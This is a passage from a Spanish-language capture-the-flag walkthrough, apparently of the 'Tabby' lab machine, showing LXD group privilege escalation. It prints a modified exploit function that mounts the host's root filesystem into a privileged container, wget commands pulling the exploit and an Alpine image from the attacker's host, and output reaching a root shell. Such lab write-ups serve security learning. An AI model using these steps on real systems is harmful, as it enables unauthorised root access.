Downloading alpine-keys-2.4-r1.apk
...
...
...
```

* Modifica el Exploit, elimina parte de la siguiente línea **&& lxc image list** de la función **createContainer**, así debería quedar esa función:
```bash
function createContainer(){
  lxc image import $filename --alias alpine && lxd init --auto
  echo -e "[*] Listing images...\n" 
  lxc init alpine privesc -c security.privileged=true
  lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
  lxc start privesc
  lxc exec privesc sh
  cleanup
}
```

* Sube ambos archivos a la máquina víctima:
```bash
ash@tabby:/tmp$ wget http://Tu_IP/Lxd_Exploit.sh
--2023-05-12 23:04:57--  http://Tu_IP/Lxd_Exploit.sh
Connecting to Tu_IP:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1434 (1.4K) [text/x-sh]
Saving to: ‘Lxd_Exploit.sh’
Lxd_Exploit.sh                                    0%[                                                                                   
Lxd_Exploit.sh                                  100%[===========================>]   1.40K  --.-KB/s    in 0.001s  
2023-05-12 23:04:57 (2.45 MB/s) - ‘Lxd_Exploit.sh’ saved [1434/1434]
```
```
ash@tabby:/tmp$ wget http://Tu_IP/alpine-v3.18-x86_64-20230512_1700.tar.gz
--2023-05-12 23:09:09--  http://Tu_IP/alpine-v3.18-x86_64-20230512_1700.tar.gz
Connecting to Tu_IP:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3795739 (3.6M) [application/gzip]
Saving to: ‘alpine-v3.18-x86_64-20230512_1700.tar.gz’
...
```

* Mueve los archivos al directorio **/dev/shm**, esto porque sino nos dará problemas al usar el Exploit (no lo sabía hasta que lo use):
```bash
ash@tabby:/tmp$ mv Lxd_Exploit.sh alpine-v3.18-x86_64-20230512_1700.tar.gz /dev/shm
ash@tabby:/tmp$ cd /dev/shm
ash@tabby:/dev/shm$
```

* Exporta un **PATH** más grande para que funcione:
```bash
ash@tabby:/dev/shm$ export PATH=/root/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/bin/vendorl_perl:
```

* Activa el Exploit con el parámetro **-f** y agregando el comprimido:
```bash
ash@tabby:/dev/shm$ ./Lxd_Exploit.sh -f alpine-v3.18-x86_64-20230512_1700.tar.gz 
If this is your first time running LXD on this machine, you should also run: lxd init
To start your first instance, try: lxc launch ubuntu:18.04
[*] Listing images...
Creating privesc
Device giveMeRoot added to privesc         
~ # whoami
root
```

Para movernos a donde está la flag debemos ir al directorio **/mnt**, pues así funciona este Exploit:
```bash
~ # cd ..
/ # cd mnt
/mnt # ls
root
/mnt # cd root
/mnt/root # ls
bin         cdrom       etc         lib         lib64       lost+found  mnt         proc        run         snap        sys         usr
boot        dev         home        lib32       libx32      media       opt         root        sbin        srv         tmp         var
/mnt/root # cd root
/mnt/root/root # ls
root.txt  snap
/mnt/root/root # cat root.txt
...
```
Y por fin, terminamos esta máquina.
